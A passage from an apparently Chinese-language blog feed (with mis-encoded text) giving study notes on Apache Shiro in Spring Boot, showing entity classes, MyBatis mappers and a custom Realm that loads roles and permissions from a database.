class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">String</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Perms:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Perms</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> url;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">String</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUrl</span><span class="params">(<span class="keyword">String</span> url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Userå®ä½“ç±»ä¸­ä¹Ÿåº”è¯¥æ·»åŠ ä¸Šä¸€ä¸ªroles<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰è§’è‰²é›†åˆ</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Role&gt; roles;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Role&gt; <span class="title">getRoles</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> roles;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRoles</span>(<span class="params">List&lt;Role&gt; roles</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.roles = roles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UserDAOä¸­å¼€å‘ä¸€ä¸ªæŸ¥è¯¢æ–¹æ³•<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢æ‰€æœ‰è§’è‰²</span><br><span class="line"><span class="keyword">User</span> <span class="title">findRolesByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p><p>å¯¹åº”çš„Serviceä¸€æ ·<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢æ‰€æœ‰è§’è‰²</span><br><span class="line"><span class="keyword">User</span> <span class="title">findRolesByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p><p>æ¥ç€åœ¨UserDAOMapper.xmlä¸­æ·»åŠ selectæ–¹æ³•<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;resultMap <span class="built_in">id</span>=<span class="string">"userMap"</span> type=<span class="string">"User"</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span> column=<span class="string">"uid"</span> <span class="keyword">property</span>=<span class="string">"id"</span> /&gt;</span><br><span class="line">        &lt;<span class="literal">result</span> column=<span class="string">"username"</span> <span class="keyword">property</span>=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;!<span class="comment">--        è§’è‰²ä¿¡æ¯--&gt;</span></span><br><span class="line">        &lt;collection <span class="keyword">property</span>=<span class="string">"roles"</span> javaType=<span class="string">"list"</span> ofType=<span class="string">"Role"</span>&gt;</span><br><span class="line">            &lt;<span class="built_in">id</span> column=<span class="string">"id"</span> <span class="keyword">property</span>=<span class="string">"id"</span> /&gt;</span><br><span class="line">            &lt;<span class="literal">result</span> column=<span class="string">"rname"</span> <span class="keyword">property</span>=<span class="string">"name"</span> /&gt;</span><br><span class="line">        &lt;/collection&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select <span class="built_in">id</span>=<span class="string">"findRolesByUserName"</span> parameterType=<span class="string">"String"</span> resultMap=<span class="string">"userMap"</span>&gt;</span><br><span class="line">        select u.<span class="built_in">id</span> uid,u.username,r.<span class="built_in">id</span>,r.<span class="built_in">name</span> rname</span><br><span class="line">        <span class="keyword">from</span> t_user u</span><br><span class="line">        left join t_user_role ur</span><br><span class="line">        <span class="keyword">on</span> u.<span class="built_in">id</span>=ur.userid</span><br><span class="line">        left join t_role r</span><br><span class="line">        <span class="keyword">on</span> ur.roleid=r.<span class="built_in">id</span></span><br><span class="line">        <span class="keyword">where</span> u.username=<span class="comment">#&#123;username&#125;;</span></span><br><span class="line">    &lt;/select&gt;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸šåŠ¡å±‚çš„å®ç°äº†<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">User <span class="title">findRolesByUserName</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findRolesByUserName</span><span class="params">(username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>éƒ½åšå¥½äº† å°±å¯ä»¥å›åˆ°æˆ‘ä»¬çš„è‡ªå®šä¹‰Realmäº†<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//è·å–èº«ä»½ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">String</span> primaryPrincipal = (<span class="keyword">String</span>) principalCollection.getPrimaryPrincipal();</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"è°ƒç”¨æˆæƒéªŒè¯ï¼š"</span>+primaryPrincipal);</span><br><span class="line">        <span class="comment">//æ ¹æ®ä¸»èº«ä»½ä¿¡æ¯è·å–è§’è‰²å’Œæƒé™ä¿¡æ¯</span></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(primaryPrincipal))&#123;</span></span><br><span class="line"><span class="comment">//            SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addRole("user");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addStringPermission("user:find:*");</span></span><br><span class="line"><span class="comment">//            simpleAuthorizationInfo.addStringPermission("user:update:*");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            return simpleAuthorizationInfo;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        UserService userService = (UserService) ApplicationContextUtils.getBean(<span class="string">"userService"</span>);</span><br><span class="line">        User user = userService.findRolesByUserName(primaryPrincipal);</span><br><span class="line">        <span class="comment">//æˆæƒè§’è‰²ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span>(!CollectionUtils.isEmpty(user.getRoles()))&#123;</span><br><span class="line">            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> SimpleAuthorizationInfo();</span><br><span class="line">            user.getRoles().forEach(role -&gt;&#123;</span><br><span class="line">                simpleAuthorizationInfo.addRole(role.getName());</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±å®Œæˆäº†ä»å†™æ­»æ•°æ®åˆ°è¿æ¥æ•°æ®åº“çš„æˆæƒæ“ä½œäº†</p><h3 id="æƒé™ä¿¡æ¯è·å–"><a href="#æƒé™ä¿¡æ¯è·å–" class="headerlink" title="æƒé™ä¿¡æ¯è·å–"></a>æƒé™ä¿¡æ¯è·å–</h3><p>è·å–æƒé™ä¿¡æ¯åœ¨æ•°æ®åº“å°±æ¯”è¾ƒéº»çƒ¦äº†  å› ä¸ºæˆ‘ä»¬æ—¢éœ€è¦æŸ¥åˆ°ä»–çš„è§’è‰²ä¿¡æ¯è¿˜è¦æŸ¥åˆ°ä»–çš„æƒé™ä¿¡æ¯</p><p>ç°åœ¨éœ€è¦å®šä¹‰ä¸€ä¸ªæƒé™é›†åˆ  ä½†æƒé™æ˜¯ç»‘å®šè§’è‰²çš„ æ‰€ä»¥å°±éœ€è¦åœ¨Roleå®ä½“ç±»ä¸­å®šä¹‰ä¸€ä¸ªæƒé™çš„é›†åˆ<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰æƒé™é›†åˆ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">List</span>&lt;Perms&gt; perms;</span><br></pre></td></tr></table></figure></p><p>UserDAOä¸­ä¹Ÿæ·»åŠ ä¸Šæ–¹æ³•<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¹æ®è§’è‰²idæŸ¥è¯¢æƒé™é›†åˆçš„æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">List</span>&lt;Perms&gt; findPermsByRoleId(<span class="built_in">String</span> id);</span><br></pre></td></tr></table></figure></p><p>Serviceä¹ŸåŠ ä¸Š<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¹æ®è§’è‰²idæŸ¥è¯¢æƒé™é›†åˆçš„æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">List</span>&lt;Perms&gt; findPermsByRoleId(<span class="built_in">String</span> id);</span><br></pre></td></tr></table></figure></p><p>Servicelmplä¸šåŠ¡å±‚å®ç°ä¸€ä¸‹<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Perms&gt; findPermsByRoleId(String id) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findPermsByRoleId</span><span class="params">(id)</span></span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>å¯¹åº”çš„Mapperæ·»åŠ ä¸Šselect<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;select <span class="built_in">id</span>=<span class="string">"findPermsByRoleId"</span> parameterType=<span class="string">"String"</span> resultType=<span class="string">"Perms"</span>&gt;</span><br><span class="line">    select p.<span class="built_in">id</span>,p.<span class="built_in">name</span>,p.url,r.<span class="built_in">name</span></span><br><span class="line">    <span class="keyword">from</span> t_role r</span><br><span class="line">    left join t_role_perms rp</span><br><span class="line">    <span class="keyword">on</span> r.<span class="built_in">id</span> = rp.roleid</span><br><span class="line">    left join t_perms p</span><br><span class="line">    <span class="keyword">on</span> rp.permsid = p.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">where</span> r.<span class="built_in">id</span>=<span class="comment">#&#123;id&#125;;</span></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></p><p>è¿™äº›éƒ½åšå®Œäº† å°±å¯ä»¥å»è‡ªå®šä¹‰Realmä¸­æ·»åŠ è·å–æƒé™ä¿¡æ¯äº†</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">    @Override</span><br><span class="line">    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;</span><br><span class="line">        //è·å–èº«ä»½ä¿¡æ¯</span><br><span class="line">        String primaryPrincipal = (String) principalCollection.getPrimaryPrincipal();</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("è°ƒç”¨æˆæƒéªŒè¯ï¼š"+primaryPrincipal);</span><br><span class="line">        //æ ¹æ®ä¸»èº«ä»½ä¿¡æ¯è·å–è§’è‰²å’Œæƒé™ä¿¡æ¯</span><br><span class="line">//        <span class="keyword">if</span>("xiaochen".equals(primaryPrincipal))&#123;</span><br><span class="line">//            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="built_in">new</span> SimpleAuthorizationInfo();</span><br><span class="line">//</span><br><span class="line">//            simpleAuthorizationInfo.addRole("user");</span><br><span class="line">//</span><br><span class="line">//            simpleAuthorizationInfo.addStringPermission("user:find:*");</span><br><span class="line">//            simpleAuthorizationInfo.addStringPermission("user:update:*");</span><br><span class="line">//</span><br><span class="line">//            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">//        &#125;</span><br><span class="line">        UserService userService = (UserService) ApplicationContextUtils.getBean("userService");</span><br><span class="line">        <span class="keyword">User</span> <span class="keyword">user</span> = userService.findRolesByUserName(primaryPrincipal);</span><br><span class="line">        //æˆæƒè§’è‰²ä¿¡æ¯</span><br><span class="line">        <span class="keyword">if</span>(!CollectionUtils.isEmpty(<span class="keyword">user</span>.getRoles()))&#123;</span><br><span class="line">            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="built_in">new</span> SimpleAuthorizationInfo();</span><br><span class="line">            <span class="keyword">user</span>.getRoles().<span class="keyword">forEach</span>(<span class="keyword">role</span> -&gt;&#123;</span><br><span class="line">                simpleAuthorizationInfo.addRole(<span class="keyword">role</span>.getName());</span><br><span class="line"></span><br><span class="line">                //æƒé™ä¿¡æ¯</span><br><span class="line">                List&lt;Perms&gt; perms = userService.findPermsByRoleId(<span class="keyword">role</span>.getId());</span><br><span class="line">                <span class="keyword">if</span>(!CollectionUtils.isEmpty(perms))&#123;</span><br><span class="line">                    perms.<span class="keyword">forEach</span>(perm-&gt;&#123;</span><br><span class="line">                        simpleAuthorizationInfo.addStringPermission(perm.getName());</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œä»¥æ•°æ®åº“çš„è®¤è¯æˆæƒæ“ä½œå°±å…¨éƒ¨åšå®Œäº†</p><p>å‰©ä¸‹çš„å°±æ˜¯å»ä¼˜åŒ–äº†  å› ä¸ºç°åœ¨è¿™æ ·å†™ æ¯æ¬¡ç™»å½•çš„æ—¶å€™éƒ½ä¼šå»æŸ¥æ•°æ®åº“  æ‰€ä»¥æˆ‘ä»¬è¦å°†æˆæƒè§’è‰²ä¿¡æ¯å’Œæƒé™ä¿¡æ¯è¿›è¡Œä¸€ä¸ªç¼“å­˜  æ¥ä¼˜åŒ–æˆ‘ä»¬çš„è®¤è¯å’Œæˆæƒ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æˆæƒ&quot;&gt;&lt;a href=&quot;#æˆæƒ&quot; class=&quot;headerlink&quot; title=&quot;æˆæƒ&quot;&gt;&lt;/a&gt;æˆæƒ&lt;/h1&gt;&lt;h2 id=&quot;æˆæƒæ–¹å¼&quot;&gt;&lt;a href=&quot;#æˆæƒæ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;æˆæƒæ–¹å¼&quot;&gt;&lt;/a&gt;æˆæƒæ–¹å¼&lt;/h
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/12/2-æ•°æ®åº“+MD5+Saltè®¤è¯</title>
    <link href="http://yoursite.com/2020/12/02/Shiro-2020-12-2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/12/02/Shiro-2020-12-2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-12-02T02:03:12.000Z</published>
    <updated>2021-02-21T04:57:40.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot-Shiroæ•´åˆæ€è·¯"><a href="#SpringBoot-Shiroæ•´åˆæ€è·¯" class="headerlink" title="SpringBoot+Shiroæ•´åˆæ€è·¯"></a>SpringBoot+Shiroæ•´åˆæ€è·¯</h1><h2 id="æ•°æ®åº“-MD5-Saltè®¤è¯åŠŸèƒ½"><a href="#æ•°æ®åº“-MD5-Saltè®¤è¯åŠŸèƒ½" class="headerlink" title="æ•°æ®åº“+MD5+Saltè®¤è¯åŠŸèƒ½"></a>æ•°æ®åº“+MD5+Saltè®¤è¯åŠŸèƒ½</h2><p>ä¹‹å‰å®Œæˆäº†ç”¨æˆ·md5+saltçš„ç”¨æˆ·æ³¨å†Œæµç¨‹</p><p>ç°åœ¨å°±å®Œæˆä»¥ä¸‹è®¤è¯çš„åŠŸèƒ½</p><p>è®¤è¯çš„æ•°æ®ä¾æ—§æ˜¯æ¥è‡ªäºæ•°æ®åº“ä¸­çš„<br>è¿™é‡Œå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹è‡ªå®šä¹‰realmä¸­çš„è®¤è¯å®ç°æ¢æˆæ•°æ®åº“è€Œä¸æ˜¯å†™æ­»çš„åŠŸèƒ½</p><p>éœ€è¦ç°åœ¨UserDAOå¢åŠ ä¸€ä¸ªæ–¹æ³•<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span> <span class="title">findByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p><p>åœ¨UserDAOMapper.xmlä¸­æ·»åŠ å¯¹åº”çš„selectæ–¹æ³•<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"findByUserName"</span> parameterType=<span class="string">"String"</span> resultType=<span class="string">"User"</span>&gt;</span><br><span class="line">        <span class="keyword">select</span> id,username,password,salt <span class="keyword">from</span> t_user</span><br><span class="line">        <span class="keyword">where</span> username = <span class="meta">#&#123;username&#125;</span></span><br><span class="line">    &lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><br>åŒæ ·çš„åœ¨ä¸šåŠ¡å±‚UserServiceæ·»åŠ æ–¹æ³•<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢ä¸šåŠ¡çš„æ–¹æ³•</span><br><span class="line">    <span class="keyword">User</span> <span class="title">findByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure><br>UserServiceImplä¸­çš„å®ç°ä¹Ÿè¦åŠ ä¸Š<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">User <span class="title">findByUserName</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findByUserName</span><span class="params">(username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ç€å°±æ˜¯å»ä¿®æ”¹realmæ–¹æ³•å•¦,ä½†æ˜¯å¹¶æ²¡æœ‰ä¸šåŠ¡å¯¹è±¡ï¼Œç°åœ¨ä¸šåŠ¡å¯¹è±¡æ˜¯ç”±å·¥å‚å»è¿›è¡Œæ³¨å…¥çš„</p><p>æ‰€ä»¥å°±å»ºä¸€ä¸ªå·¥å…·ç±»ApplicationContextUtils<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContextAware;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextUtils</span> <span class="keyword">implements</span> <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ApplicationContext context;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.context = applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ ¹æ®beanåå­—è·å–å·¥å‚ä¸­æŒ‡å®šbeanå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function">Object <span class="title">getBean</span><span class="params">(String beanName)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> context.<span class="title">getBean</span><span class="params">(beanName)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥æŠŠè‡ªå®šä¹‰realmä¸­å†™æ­»çš„æ•°æ®æ”¹ä¸ºæ•°æ®åº“è¿æ¥äº†<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 